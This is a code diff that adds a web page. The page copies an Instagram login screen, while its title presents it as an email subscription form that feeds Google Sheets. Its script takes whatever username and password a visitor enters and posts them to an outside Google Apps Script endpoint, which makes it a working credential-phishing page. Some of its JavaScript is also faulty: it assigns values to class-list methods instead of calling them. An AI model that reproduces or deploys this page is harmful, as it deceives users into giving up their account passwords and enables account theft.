@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Email Subscription Form into Google Sheets</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body>
+    <div class="flex flex-col items-center w-full mt-28">
+        <img src="Instagram-Logo-2010-2013.png" width="200px" alt="">
+        <form action="" method="post" name="submit-to-google-sheet">
+            <div class="text-center">
+                <input
+                    class="w-[90%] mx-6 my-2 p-4 border-solid border-2 border-stone-200 rounded-md placeholder:text-lg outline-none"
+                    type="email" name="Email" id="" placeholder="Phone number, username, or email" required>
+                <input
+                    class="w-[90%] mx-6 my-2 p-4 border-solid border-2 border-stone-200 rounded-md placeholder:text-lg outline-none"
+                    type="password" name="Password" id="" placeholder="Password" required>
+                    <button
+                        class="w-[90%] mx-6 my-2 px-4 py-3 border-solid border-2 text-white text-xl bg-blue-500 border-blue-500 rounded-xl"
+                        type="submit">Login</button>
+            </div>
+            <div class="text-center text-lg m-2">Forgot Password?</div>
+            <hr >
+            <div class="text-center m-3">Don't have an account? <span type="submit" class=" text-blue-600">Sign up</span>
+        </div>
+    </form>
+    <span id="msg"></span>
+</div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxzkQydpKv9aMHvFTr2-Dye8gSnkSdrGToKtvEtbhhyQ3kiEdHGbNRibyL7A4yt86WD/exec';
+        const form = document.forms['submit-to-google-sheet'];
+        const msg = document.getElementById('msg'); // Fix here
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            fetch(scriptURL, {
+                method: 'POST',
+                body: new FormData(form)
+            })
+                .then(response => {
+                    msg.classList.add = "scroll"
+                    setTimeout(() => {
+                        msg.classList.remove = "scroll"
+                    }, 2000);
+                })
+                .catch(error => console.error('Error!', error.message));
+        });
+    </script>
+</body>
+
+</html>
